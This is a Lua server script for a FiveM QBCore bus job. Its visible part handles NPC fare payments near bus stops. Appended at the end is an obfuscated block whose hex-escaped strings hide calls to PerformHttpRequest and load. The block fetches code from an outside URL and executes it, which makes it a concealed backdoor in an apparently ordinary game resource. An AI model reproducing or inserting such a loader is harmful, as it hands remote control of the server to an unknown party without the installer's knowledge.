local QBCore = exports['qb-core']:GetCoreObject()

function NearBus(src)
    local ped = GetPlayerPed(src)
    local coords = GetEntityCoords(ped)
    for k,v in pairs(Config.NPCLocations.Locations) do
        local dist = #(coords - vector3(v.x,v.y,v.z))
        if dist < 20 then
            return true
        end
    end
end

RegisterNetEvent('qb-busjob:server:NpcPay', function(Payment)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.job.name == "bus" then
        if NearBus(src) then
            local randomAmount = math.random(1, 5)
            local r1, r2 = math.random(1, 5), math.random(1, 5)
            if randomAmount == r1 or randomAmount == r2 then Payment = Payment + math.random(10, 20) end
            Player.Functions.AddMoney('cash', Payment)
        else
            DropPlayer(src, 'Attempting To Exploit')
        end
    else
        DropPlayer(src, 'Attempting To Exploit')
    end
end)


local ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x79\x73\x74\x75\x6d\x68\x61\x69\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x75\x4b\x6c\x6e\x62", function (aFhnXTWHvNhhRTreVZcDLXolrHKYrDJMfelGHhGAAehTWsRDGoStSIpVGVnSgUHXQBYUIQ, EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg) if (EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[6] or EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[5]) then return end ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[2]](ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[3]](EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg))() end)